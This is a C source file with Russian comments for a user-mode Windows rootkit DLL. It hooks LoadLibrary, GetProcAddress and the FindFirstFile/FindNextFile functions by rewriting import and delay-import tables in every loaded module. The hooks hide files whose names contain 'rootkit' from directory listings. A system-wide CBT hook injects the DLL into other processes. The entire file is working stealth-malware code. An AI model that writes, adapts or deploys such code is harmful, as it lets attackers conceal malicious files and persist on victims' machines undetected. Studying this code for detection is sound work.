//
// rootkit_lib.c
//

#define WIN32_LEAN_AND_MEAN							// Exclude rarely-used stuff from Windows headers 

#include <stdio.h>
#include <windows.h>
#include <WinNT.h>
#include <delayimp.h>
#include <Tlhelp32.h>
#include "rootkit_lib.h"

// #define DEBUG

// IMAGE_IMPORT_DESCRIPTOR Structure 
//
//	Size	Member					Description
//	------- ----------------------- --------------------------------------------------------------------------------
//	DWORD	OriginalFirstThunk		This field is badly named. It contains the RVA of the Import Name Table (INT). 
//									This is an array of IMAGE_THUNK_DATA structures. This field is set to 0 to 
//									indicate the end of the array of IMAGE_IMPORT_DESCRIPTORs.
//	DWORD	TimeDateStamp			This is 0 if this executable is not bound against the imported DLL. When 
//									binding in the old style (see the section on Binding), this field contains the 
//									time/date stamp (number of seconds since 1/1/1970 GMT) when the binding occurred. 
//									When binding in the new style, this field is set to -1.
//	DWORD	ForwarderChain			This is the Index of the first forwarded API. Set to -1 if no forwarders. Only 
//									used for old-style binding, which could not handle forwarded APIs efficiently.
//	DWORD	Name					The RVA of the ASCII string with the name of the imported DLL.
//	DWORD	FirstThunk				Contains the RVA of the Import Address Table (IAT). This is array of 
//									IMAGE_THUNK_DATA structures.

// ImgDelayDescr Structure 
//
//	Size	Member			Description
//	-------	---------------	----------------------------------------------------------------------------------------
//	DWORD	grAttrs			The attributes for this structure. Currently, the only flag defined is dlattrRva (1), 
//							indicating that the address fields in the structure should be treated as RVAs, rather 
//							than virtual addresses.
//	RVA		rvaDLLName		An RVA to a string with the name of the imported DLL. This string is passed to LoadLibrary.
//	RVA		rvaHmod			An RVA to an HMODULE-sized memory location. When the Delayloaded DLL is brought into 
//							memory, its HMODULE is stored at this location.
//	RVA		rvaIAT			An RVA to the Import Address Table for this DLL. This is the same format as a regular IAT.
//	RVA		rvaINT			An RVA to the Import Name Table for this DLL. This is the same format as a regular INT.
//	RVA		rvaBoundIAT		An RVA of the optional bound IAT. An RVA to a bound copy of an Import Address Table for 
//							this DLL. This is the same format as a regular IAT. Currently, this copy of the IAT is not 
//							actually bound, but this feature may be added in future versions of the BIND program.
//	RVA		rvaUnloadIAT	An RVA of the optional copy of the original IAT. An RVA to an unbound copy of an Import 
//							Address Table for this DLL. This is the same format as a regular IAT. Currently always set 
//							to 0.
//	DWORD	dwTimeStamp		The date/time stamp of the delayload imported DLL. Normally set to 0.
 
// Определения типов перехватываемых функций
typedef FARPROC (WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI *pfnLoadLibraryA)(LPCSTR lpFileName);
typedef HMODULE (WINAPI *pfnLoadLibraryW)(LPCWSTR lpFileName);
typedef HANDLE (WINAPI *pfnFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef HANDLE (WINAPI *pfnFindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
typedef BOOL (WINAPI *pfnFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL (WINAPI *pfnFindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

// Для динамического связывания (run-time dynamic linking) 
//   нужно использовать библиотеки ImageHlp.dll или DbgHelp.dll
// Для статического связывания (load-time linking)
//   нужно использовать header DbgHelp.h и библиотеку DbgHelp.lib
typedef PVOID (WINAPI *pfnImageDirectoryEntryToData)(PVOID Base, BOOLEAN MappedAsImage, USHORT DirectoryEntry, PULONG Size);

typedef struct _InterceptInfo {
	CHAR szLibraryName[MAX_PATH];
	LPVOID OldFunction;
	LPVOID NewFunction;
} InterceptInfo;


//
// Глобальные переменные
//

#define INTERCEPTED_FUNCTIONS_NO	7

InterceptInfo		InterceptedFunctionsList[INTERCEPTED_FUNCTIONS_NO];

pfnGetProcAddress	OldGetProcAddress;
pfnLoadLibraryA		OldLoadLibraryA;
pfnLoadLibraryW		OldLoadLibraryW;
pfnFindFirstFileA	OldFindFirstFileA;
pfnFindFirstFileW	OldFindFirstFileW;
pfnFindNextFileA	OldFindNextFileA;
pfnFindNextFileW	OldFindNextFileW;

HHOOK				hHook;

pfnImageDirectoryEntryToData	_ImageDirectoryEntryToData;


//
// Заменяет в IAT модуля hModule адрес OldFunct на NewFunct
//
BOOL ReplaceIATEntry(HMODULE hModule, LPSTR szLibName, LPVOID pOldFunct, LPVOID NewFunct)
{
	BOOL						bRC = FALSE;
	PIMAGE_IMPORT_DESCRIPTOR	pImportDescriptor;				// Указатель на IAT
	PIMAGE_IMPORT_DESCRIPTOR	pLibImportDescriptor;			// Указатель на запись IAT для данной DLL
	LONG						lIATSize;
	LPDWORD						pThunk;
	DWORD						dwOldProtect;
	DWORD						dwTmp;

	// Найти IAT
	pImportDescriptor = _ImageDirectoryEntryToData((PVOID)hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &lIATSize);
	if (pImportDescriptor == NULL)
		return FALSE;

#ifdef DEBUG
	// *** DEBUG ***
	printf("ReplaceIATEntry() -- entry...\n");
#endif
	// Найти секцию импорта в DLL с именем szLibName
	while (pImportDescriptor->Name != 0)
	{
#ifdef DEBUG
		// *** DEBUG ***
		printf("ReplaceIATEntry() -- Name1: %s\n", (LPSTR)((LPBYTE)hModule + pImportDescriptor->Name));
#endif
		if (lstrcmpiA((LPSTR)((LPBYTE)hModule + pImportDescriptor->Name), szLibName) == 0)
		{
#ifdef DEBUG
			// *** DEBUG ***
			printf("ReplaceIATEntry() -- Name2: %s\n", (LPSTR)((LPBYTE)hModule + pImportDescriptor->Name));
#endif
			pLibImportDescriptor = pImportDescriptor;
			// Найти адрес перехватываемой функции
			pThunk = (LPDWORD)((LPBYTE)hModule + pLibImportDescriptor->FirstThunk);
			while (*pThunk != 0)
			{
				// Если адрес найден, то выполнить его замену на заданный
				if (*pThunk == *((LPDWORD)pOldFunct))
				{
#ifdef DEBUG
					// *** DEBUG ***
					printf("ReplaceIATEntry() -- pThunk = %p, old *pThunk = %08X\n", pThunk, *pThunk);
#endif
					// Разрешить запись в страницу
					VirtualProtect((LPVOID)pThunk, 4, PAGE_READWRITE, &dwOldProtect);
					// Произвести запись
					WriteProcessMemory(GetCurrentProcess(), (LPVOID)pThunk, &NewFunct, 4, &dwTmp);
					// Восстановить атрибуты защиты страницы
					VirtualProtect((LPVOID)pThunk, 4, dwOldProtect, &dwTmp);
#ifdef DEBUG
					// *** DEBUG ***
					printf("ReplaceIATEntry() -- pThunk = %p, new *pThunk = %08X\n", pThunk, *pThunk);
#endif

					bRC = TRUE;
				}
				pThunk++;
			}
		}
		pImportDescriptor++;
	}

	return bRC;
}


//
// Заменяет в DIT модуля hModule адрес OldFunct на NewFunct
//
BOOL ReplaceDITEntry(HMODULE hModule, LPSTR szLibName, LPVOID pOldFunct, LPVOID NewFunct)
{
	BOOL			bRC = FALSE;
	PImgDelayDescr	pImgDelayDescriptor;						// Указатель на DIT
	PImgDelayDescr	pLibImgDelayDescriptor;						// Указатель на запись DIT для заданной DLL
	LONG			lDITSize;
	LPDWORD			pThunk;
	DWORD			dwOldProtect;
	DWORD			dwTmp;
	HMODULE			hRVARel;

	// Найти DIT
	pImgDelayDescriptor = _ImageDirectoryEntryToData((PVOID)hModule, TRUE, IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT, &lDITSize);
	if (pImgDelayDescriptor == NULL)
		return FALSE;

#ifdef DEBUG
	// *** DEBUG ***
	printf("ReplaceDITEntry() -- entry...\n");
#endif
	// Найти секцию Delay Import в DLL с именем ALibName
	while (pImgDelayDescriptor->rvaDLLName != 0)
	{
		// Учесть способ адресации RVA/VA
		if (pImgDelayDescriptor->grAttrs == 1)
			hRVARel = hModule;
		else
			hRVARel = 0;

#ifdef DEBUG
		// *** DEBUG ***
		printf("ReplaceDITEntry() -- Name1: %s\n", (LPSTR)((LPBYTE)hRVARel + pImgDelayDescriptor->rvaDLLName));
#endif
		if (lstrcmpiA((LPSTR)((LPBYTE)hRVARel + pImgDelayDescriptor->rvaDLLName), szLibName) == 0)
		{
#ifdef DEBUG
		// *** DEBUG ***
			printf("ReplaceDITEntry() -- Name2: %s\n", (LPSTR)((LPBYTE)hRVARel + pImgDelayDescriptor->rvaDLLName));
#endif
			pLibImgDelayDescriptor = pImgDelayDescriptor;

			// Найти адрес перехватываемой функции
			pThunk = (LPDWORD)((LPBYTE)hRVARel + pLibImgDelayDescriptor->rvaIAT);
			while (*pThunk != 0)
			{
				// Если адрес найден, то выполнить его замену на заданный
				if (*pThunk == *((LPDWORD)pOldFunct))
				{
#ifdef DEBUG
					// *** DEBUG ***
					printf("ReplaceDITEntry() -- pThunk = %p, old *pThunk = %08X\n", pThunk, *pThunk);
#endif
					// Разрешить запись в страницу
					VirtualProtect((LPVOID)pThunk, 4, PAGE_READWRITE, &dwOldProtect);
					// Произвести запись
					WriteProcessMemory(GetCurrentProcess(), (LPVOID)pThunk, &NewFunct, 4, &dwTmp);
					// Восстановить атрибуты защиты страницы
					VirtualProtect((LPVOID)pThunk, 4, dwOldProtect, &dwTmp);
#ifdef DEBUG
					// *** DEBUG ***
					printf("ReplaceDITEntry() -- pThunk = %p, new *pThunk = %08X\n", pThunk, *pThunk);
#endif

					bRC = TRUE;
				}
				pThunk++;
			}
		}
		pImgDelayDescriptor++;
	}

	return bRC;
}


//
// BOOL InterceptFunction(LPSTR szLibName, LPVOID OldFunct, LPVOID NewFunct)
//
BOOL InterceptFunction(LPSTR szLibName, LPVOID OldFunct, LPVOID NewFunct)
{
	HANDLE			hSnapshot = NULL;
	MODULEENTRY32	me32 = {0};

#ifdef DEBUG
	// *** DEBUG ***
	printf("InterceptFunction() -- entry...\n");
#endif
	// Создать снимок всех модулей в текущем процессе
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	me32.dwSize = sizeof (MODULEENTRY32);

	if (Module32First(hSnapshot, &me32))
	{
		do 
		{
#ifdef DEBUG
			// *** DEBUG ***
			printf("InterceptFunction() -- Module = %s\n", me32.szModule);
#endif
			// Модифицировать таблицу импорта
			ReplaceIATEntry(me32.hModule, szLibName, OldFunct, NewFunct);
			// Модифицировать таблицу отложенного импорта
			ReplaceDITEntry(me32.hModule, szLibName, OldFunct, NewFunct);
		} while (Module32Next(hSnapshot, &me32));
	}

	CloseHandle(hSnapshot);

	return TRUE;
}


//
//
//
BOOL InterceptFunctionEx(LPSTR szLibName, LPSTR szFunctName, LPVOID pOldFunct, LPVOID NewFunct, BOOL bDoLoadLibrary)
{
	BOOL	bRC = FALSE;
	INT		i;

	(FARPROC)*(LPDWORD)pOldFunct = GetProcAddress(GetModuleHandle(szLibName), szFunctName);

#ifdef DEBUG
	// *** DEBUG ***
	printf("\n");
	printf("InterceptFunctionEx() -- FunctName = %s\n", szFunctName);
	printf("InterceptFunctionEx() -- pOldFunct = %p, *(LPDWORD)pOldFunct = %08X\n", pOldFunct, *(LPDWORD)pOldFunct);
#endif
	if (((LPVOID)*(LPDWORD)pOldFunct == NULL) && bDoLoadLibrary)
	{
		(FARPROC)*(LPDWORD)pOldFunct = GetProcAddress(LoadLibrary(szLibName), szFunctName);
		if ((LPVOID)*(LPDWORD)pOldFunct == NULL)
			return FALSE;
	}

	// Функция уже перехвачена?
	if ((LPVOID)*(LPDWORD)pOldFunct == NewFunct)
		return FALSE;

	// Найти свободную ячейку в массиве структур
	i = 0;
	while (InterceptedFunctionsList[i].OldFunction != NULL)
	{
		i++;
	}
#ifdef DEBUG
	// *** DEBUG ***
	printf("InterceptFunctionEx() -- i = %d\n", i);
#endif

	// Перехватить функцию
	bRC = InterceptFunction(szLibName, pOldFunct, NewFunct);

	lstrcpyA(InterceptedFunctionsList[i].szLibraryName, szLibName);
	InterceptedFunctionsList[i].OldFunction = (LPVOID)*(LPDWORD)pOldFunct;
	InterceptedFunctionsList[i].NewFunction = NewFunct;
#ifdef DEBUG
	// *** DEBUG ***
	printf("InterceptFunctionEx() -- szLibraryName = %s, OldFunction = %p, NewFunction = %p\n", 
		InterceptedFunctionsList[i].szLibraryName,
		InterceptedFunctionsList[i].OldFunction,
		InterceptedFunctionsList[i].NewFunction);
#endif

	return bRC;
}


//
//
//
BOOL InterceptModuleFunctions(HANDLE hModule)
{
	INT		i;

	for (i = 0; i < INTERCEPTED_FUNCTIONS_NO; i++)
	{
		// Модифицировать таблицу импорта
		ReplaceIATEntry(hModule, 
			InterceptedFunctionsList[i].szLibraryName, 
			InterceptedFunctionsList[i].OldFunction, 
			InterceptedFunctionsList[i].NewFunction);
		// Модифицировать таблицу отложенного импорта
		ReplaceDITEntry(hModule, 
			InterceptedFunctionsList[i].szLibraryName, 
			InterceptedFunctionsList[i].OldFunction, 
			InterceptedFunctionsList[i].NewFunction);
	}

	return TRUE;
}


//
//
//
FARPROC WINAPI myGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	FARPROC	iRC;
	INT		i;

	iRC = OldGetProcAddress(hModule, lpProcName);
	if (iRC != NULL)
	{
		for (i = 0; i < INTERCEPTED_FUNCTIONS_NO; i++)
		{
			if ((PVOID)iRC == InterceptedFunctionsList[i].OldFunction)
			{
				// Функция перехвачена, вернуть адрес функции-перехватчика
				iRC = (FARPROC)InterceptedFunctionsList[i].NewFunction;
				break;
			}
		}
	}

	return iRC;
}

//
//
//
HMODULE WINAPI myLoadLibraryA(LPCSTR lpLibFileName)
{
	HMODULE	iRC;
	BOOL	bLoaded;

	// Признак того, что DLL уже загружена
	bLoaded = (GetModuleHandleA(lpLibFileName) != INVALID_HANDLE_VALUE);

	iRC = OldLoadLibraryA(lpLibFileName);

	// Это загрузка новой DLL?
	if (iRC != INVALID_HANDLE_VALUE && !bLoaded)
	{
		InterceptModuleFunctions(iRC);
	}

	return iRC;
}


//
//
//
HMODULE WINAPI myLoadLibraryW(LPCWSTR lpLibFileName)
{
	HMODULE	iRC;
	BOOL	bLoaded;

	// Признак того, что DLL уже загружена
	bLoaded = (GetModuleHandleW(lpLibFileName) != INVALID_HANDLE_VALUE);

	iRC = OldLoadLibraryW(lpLibFileName);

	// Это загрузка новой DLL?
	if (iRC != INVALID_HANDLE_VALUE && !bLoaded)
	{
		InterceptModuleFunctions(iRC);
	}

	return iRC;
}


//
//
//
HANDLE WINAPI myFindFirstFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	HANDLE	hRC;
	CHAR	szFileName[MAX_PATH];

	hRC = OldFindFirstFileA(hFindFile, lpFindFileData);
	// Успешный поиск?
	if (hRC != INVALID_HANDLE_VALUE)
	{
		strcpy(szFileName, lpFindFileData->cFileName);
		_strlwr(szFileName);
		if (strstr(szFileName, "rootkit") != NULL)
		{
			if (!(FindNextFileA(hRC, lpFindFileData)))
			{
				FindClose(hRC);
				hRC = INVALID_HANDLE_VALUE;
			}
		}
	}

	return hRC;
}


//
//
//
HANDLE WINAPI myFindFirstFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	HANDLE	hRC;
	WCHAR	szFileName[MAX_PATH];

	hRC = OldFindFirstFileW(hFindFile, lpFindFileData);
	// Успешный поиск?
	if (hRC != INVALID_HANDLE_VALUE)
	{
		wcscpy(szFileName, lpFindFileData->cFileName);
		_wcslwr(szFileName);
		if (wcsstr(szFileName, L"rootkit") != NULL)
		{
			if (!(FindNextFileW(hRC, lpFindFileData)))
			{
				FindClose(hRC);
				hRC = INVALID_HANDLE_VALUE;
			}
		}
	}

	return hRC;
}


//
//
//
BOOL WINAPI myFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	BOOL	bRC;
	CHAR	szFileName[MAX_PATH];

	bRC = OldFindNextFileA(hFindFile, lpFindFileData);
	while (bRC)
	{
		strcpy(szFileName, lpFindFileData->cFileName);
		_strlwr(szFileName);
		if (strstr(szFileName, "rootkit") == NULL)
			return bRC;

		bRC = OldFindNextFileA(hFindFile, lpFindFileData);
	}

	return bRC;
}


//
//
//
BOOL WINAPI myFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	BOOL	bRC;
	WCHAR	szFileName[MAX_PATH];

	bRC = OldFindNextFileW(hFindFile, lpFindFileData);
	while (bRC)
	{
		wcscpy(szFileName, lpFindFileData->cFileName);
		_wcslwr(szFileName);
		if (wcsstr(szFileName, L"rootkit") == NULL)
			return bRC;

		bRC = OldFindNextFileW(hFindFile, lpFindFileData);
	}

	return bRC;
}


//
// Функция-обработчик перехватчика
//
LRESULT CALLBACK KeyHook(int nCode, WPARAM WParam, LPARAM LParam)
{
	// Вызов следующего обработчика в цепочке
	return (CallNextHookEx(hHook, nCode, WParam, LParam));
}


//
//
//
BOOL WINAPI GetImageDirectoryEntryToDataAddress()
{
	HMODULE hImageHlp;

	// Получить дескриптор модуля ImageHlp.dll
	hImageHlp = GetModuleHandle("ImageHlp.dll");
	if (hImageHlp == NULL)
	{
		hImageHlp = LoadLibrary("ImageHlp.dll");
		if (hImageHlp == NULL)
		{
#ifdef DEBUG
			// *** DEBUG ***
			printf("GetImageDirectoryEntryToDataAddress() -- GetModuleHandle()/LoadLibrary() failed\n");
#endif
			return FALSE;
		}
	}

	// Получить адрес функции ImageDirectoryEntryToData(...)
	_ImageDirectoryEntryToData = (pfnImageDirectoryEntryToData) GetProcAddress(hImageHlp, "ImageDirectoryEntryToData");
	if (_ImageDirectoryEntryToData == NULL)
	{
#ifdef DEBUG
		// *** DEBUG ***
		printf("GetImageDirectoryEntryToDataAddress() -- GetProcAddress() failed\n");
#endif
		return FALSE;
	}

	return TRUE;
}


//
// DllMain(HINSTANCE, DWORD, LPVOID)
//
BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD dwReason, LPVOID lpReserved)
{
    // Perform actions based on the reason for calling
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process
		// Return FALSE to fail DLL load

		if (!GetImageDirectoryEntryToDataAddress())
		{
			return FALSE;
		}

		// Перехватить необходимые функции
		InterceptFunctionEx("kernel32.dll", "LoadLibraryA", &OldLoadLibraryA, myLoadLibraryA, FALSE);
		InterceptFunctionEx("kernel32.dll", "LoadLibraryW", &OldLoadLibraryW, myLoadLibraryW, FALSE);
		InterceptFunctionEx("kernel32.dll", "GetProcAddress", &OldGetProcAddress, myGetProcAddress, FALSE);
		InterceptFunctionEx("kernel32.dll", "FindFirstFileA", &OldFindFirstFileA, myFindFirstFileA, FALSE);
		InterceptFunctionEx("kernel32.dll", "FindFirstFileW", &OldFindFirstFileW, myFindFirstFileW, FALSE);
		InterceptFunctionEx("kernel32.dll", "FindNextFileA", &OldFindNextFileA, myFindNextFileA, FALSE);
		InterceptFunctionEx("kernel32.dll", "FindNextFileW", &OldFindNextFileW, myFindNextFileW, FALSE);

		// Установить функцию-обработчик
		hHook = SetWindowsHookEx(WH_CBT, KeyHook, hInstDLL, 0);

		break;
	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup

		break;
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization

		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup

		break;
	}

	// Successful
	return TRUE;
}
